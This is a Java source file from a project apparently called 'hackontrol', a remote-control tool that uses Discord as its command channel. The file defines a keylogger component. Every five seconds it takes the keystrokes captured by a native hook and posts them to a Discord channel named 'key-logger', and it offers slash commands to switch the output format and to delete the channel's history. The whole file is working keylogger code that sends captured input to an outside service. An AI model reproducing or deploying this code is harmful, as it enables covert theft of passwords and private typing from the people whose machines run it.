package com.khopan.hackontrol.channel;

import java.awt.event.KeyEvent;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.NativeLibrary;
import com.khopan.hackontrol.NativeLibrary.KeyEntry;
import com.khopan.hackontrol.manager.command.CommandContext;
import com.khopan.hackontrol.manager.command.CommandManager;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.HackontrolMessage;

import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageHistory;
import net.dv8tion.jda.api.interactions.commands.build.Commands;

public class KeyLoggerChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "key-logger";

	private boolean rawKeyMode;

	public KeyLoggerChannel() {
		this.rawKeyMode = false;
	}

	@Override
	public String getName() {
		return KeyLoggerChannel.CHANNEL_NAME;
	}

	@Override
	public void register(Registry registry) {
		registry.register(CommandManager.COMMAND_REGISTRY, Commands.slash("togglerawkey", "Toggle between raw key and text mode"), this :: commandToggleRawKey);
		registry.register(CommandManager.COMMAND_REGISTRY, Commands.slash("flush", "Delete all messages in this channel"), this :: commandFlush);
		Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(this :: threadKeyLogger, 2500, 5000, TimeUnit.MILLISECONDS);
	}

	private void commandToggleRawKey(CommandContext context) {
		this.rawKeyMode = !this.rawKeyMode;
		HackontrolMessage.deletable(context.reply(), "**Current Mode: " + (this.rawKeyMode ? "Raw Key" : "Text") + "**");
	}

	private void commandFlush(CommandContext context) {
		MessageHistory.getHistoryFromBeginning(context.getChannel()).queue(history -> {
			List<Message> list = history.getRetrievedHistory();

			for(int i = 0; i < list.size(); i++) {
				list.get(i).delete().queue();
			}
		});

		context.thinking(hook -> hook.deleteOriginal().queue());
	}

	private void threadKeyLogger() {
		try {
			if(NativeLibrary.KEYSTROKE_LIST.isEmpty()) {
				return;
			}

			Hackontrol.LOGGER.info("Key stroke: {}", NativeLibrary.KEYSTROKE_LIST.size());
			List<KeyEntry> list = new ArrayList<>();
			NativeLibrary.KEYSTROKE_LIST.forEach(list :: add);
			NativeLibrary.KEYSTROKE_LIST.clear();
			List<String> messageList = new ArrayList<>();

			if(this.rawKeyMode) {
				this.modeRawKey(list, messageList);
				return;
			}

			StringBuilder builder = new StringBuilder();

			for(int i = 0; i < list.size(); i++) {
				KeyEntry entry = list.get(i);

				if(!entry.keyDown) {
					continue;
				}

				String entryText = KeyEvent.getKeyText(entry.keyCode);

				if(builder.length() + entryText.length() > 1992) {
					messageList.add(builder.toString());
					builder = new StringBuilder();
				}

				builder.append(entryText);
			}

			if(!builder.isEmpty()) {
				messageList.add(builder.toString());
			}

			for(int i = 0; i < messageList.size(); i++) {
				String message = messageList.get(i);
				this.channel.sendMessage("```\n" + message + "\n```").queue();
			}
		} catch(Throwable Errors) {
			Errors.printStackTrace();
		}
	}

	private void modeRawKey(List<KeyEntry> list, List<String> messageList) {
		StringBuilder builder = new StringBuilder();
		boolean first = true;

		for(int i = 0; i < list.size(); i++) {
			KeyEntry entry = list.get(i);
			String entryText = (first ? "" : " ") + this.getKeyEntryText(entry);
			first = false;

			if(builder.length() + entryText.length() > 2000) {
				messageList.add(builder.toString());
				builder = new StringBuilder();
				first = true;
			}

			builder.append(entryText);
		}

		if(!builder.isEmpty()) {
			messageList.add(builder.toString());
		}

		for(int i = 0; i < messageList.size(); i++) {
			String message = messageList.get(i);
			this.channel.sendMessage(message).queue();
		}
	}

	private String getKeyEntryText(KeyEntry entry) {
		String letter = KeyEvent.getKeyText(entry.keyCode);
		int count = (entry.systemKey ? 2 : 0) + (entry.fake ? 1 : 0);
		String asterisk = "*".repeat(count);
		StringBuilder builder = new StringBuilder();
		builder.append(asterisk);
		builder.append('`');
		builder.append(entry.keyDown ? '↓' : '↑');
		builder.append(letter);
		builder.append('`');
		builder.append(asterisk);
		return builder.toString();
	}
}
